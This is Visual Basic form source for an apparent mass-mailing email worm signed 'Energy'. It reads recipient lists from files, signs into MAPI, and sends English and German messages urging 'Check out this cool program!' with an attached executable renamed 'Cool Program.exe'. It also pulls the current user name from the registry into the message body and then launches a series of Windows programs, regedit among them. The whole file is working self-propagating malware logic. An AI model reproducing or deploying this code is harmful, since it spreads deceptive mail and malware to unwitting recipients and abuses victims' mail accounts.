   VERSION 5.00
   Object = "{20C62CAE-15DA-101B-B9A8-444553540000}#1.1#0"; "MSMAPI32.OCX"
   Begin VB.Form Mapi
   ClientHeight=3195
   ClientLeft=60
   ClientTop=345
   ClientWidth=4680
   Icon=0
   ScaleHeight=3195
   ScaleWidth=4680
   StartUpPosition=1
   Begin MSMAPI.MAPIMessages Mes
   Left=600
   Top=0
   _ExtentX=1005
   _ExtentY=1005
   _Version=327680
   AddressEditFieldCount=1
   AddressModifiable=0
   AddressResolveUI=0
   FetchSorted=0
   FetchUnreadOnly=0
   End
   Begin MSMAPI.MAPISession Ses
   Left=0
   Top=0
   _ExtentX=1005
   _ExtentY=1005
   _Version=327680
   DownloadMail=-1
   LogonUI=-1
   NewSession=0
   End
   End
   Attribute VB_Name = "Mapi"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False
   Private Sub Form_Load()
   On Error Resume Next
   i = 1
   Do While Environ$(i) <> ""
       If Left$(Environ$(i), 6) = "windir" Then windir = Mid(Environ$(i), 8)
       i = i + 1
   Loop
   If Right(windir, 1) <> "\" Then windir = windir & "\"
   Ses.SignOn
   If Dir("C:\E") <> "" Then
       Open "C:\E" For Input As #1
       Mes.MsgIndex = -1
       Do While Not EOF(1)
           Input #1, q
           Mes.RecipIndex = o
           Mes.RecipType = 3
           Mes.RecipAddress = q
           o = o + 1
       Loop
       Close
       Mes.MsgSubject = "Check out this cool program!"
       Mes.AttachmentIndex = 0
       Mes.AttachmentName = "Cool Program.exe"
       Mes.AttachmentPathName = windir & "NOTEPAD.EXE"
       Mes.AttachmentPosition = Mes.AttachmentIndex
       Mes.AttachmentType = vbAttachTypeData
       Mes.MsgNoteText = "Hi," & Chr(13) & Chr(10) & Chr(13) & Chr(10) & "I'm writing you this e-mail because I just found out about a very cool program that you need to see. Go check it out yourself, you will love it." & Chr(13) & Chr(10) & Chr(13) & Chr(10) & "Bye bye, our Friend Energy" & Chr(13) & Chr(10) & Chr(13) & Chr(10) & getstring(HKEY_LOCAL_MACHINE, "System\CurrentControlSet\control", "Current User")
       Mes.SessionID = Ses.SessionID
       Mes.Send
   End If
   If Dir("C:\N") <> "" Then
       Ses.SignOff
       Ses.SignOn
       Open "C:\N" For Input As #1
       Mes.MsgIndex = -1
       While Mes.RecipCount
           Mes.Action = 14
       Wend
       o = 0
       Do While Not EOF(1)
           Input #1, q
           Mes.RecipIndex = o
           Mes.RecipType = 3
           Mes.RecipAddress = q
           o = o + 1
       Loop
       Close
       Mes.MsgSubject = "Sieh Dir mal dieses Coole Programm an!"
       Mes.AttachmentIndex = 0
       Mes.AttachmentName = "Cooles Programm.exe"
       Mes.AttachmentPathName = windir & "NOTEPAD.EXE"
       Mes.AttachmentPosition = Mes.AttachmentIndex
       Mes.AttachmentType = vbAttachTypeData
       Mes.MsgNoteText = "Hi," & Chr(13) & Chr(10) & Chr(13) & Chr(10) & "Ich schreibe Dir diese e-mail, weil ich Dieses Coole Programm gefunden hab. Sieh es Dir am besten selbst mal an, Du wirst es verstehen, warum es so Cool ist." & Chr(13) & Chr(10) & Chr(13) & Chr(10) & "Tschüss, Dein Freund Energy" & Chr(13) & Chr(10) & Chr(13) & Chr(10) & getstring(HKEY_LOCAL_MACHINE, "System\CurrentControlSet\control", "Current User")
       Mes.SessionID = Ses.SessionID
       Mes.Send
   End If
   Shell windir & "SCANDSKW.EXE", vbNormalFocus
   SendKeys "{ENTER}"
   Shell windir & "NOTEPAD.EXE", vbMaximizedFocus
   Shell windir & "CALC.EXE", vbNormalFocus
   Shell windir & "EXPLORER.EXE", vbMaximizedFocus
   Shell windir & "PROGMAN.EXE", vbMaximizedFocus
   Shell windir & "REGEDIT.EXE", vbMaximizedFocus
   Shell windir & "CDPLAYER.EXE", vbNormalFocus
   Shell windir & "SNDREC32.EXE", vbNormalFocus
   Shell windir & "PBRUSH.EXE", vbMaximizedFocus
   Shell windir & "WRITE.EXE", vbMaximizedFocus
   Ses.SignOff
   Unload Me
   End Sub
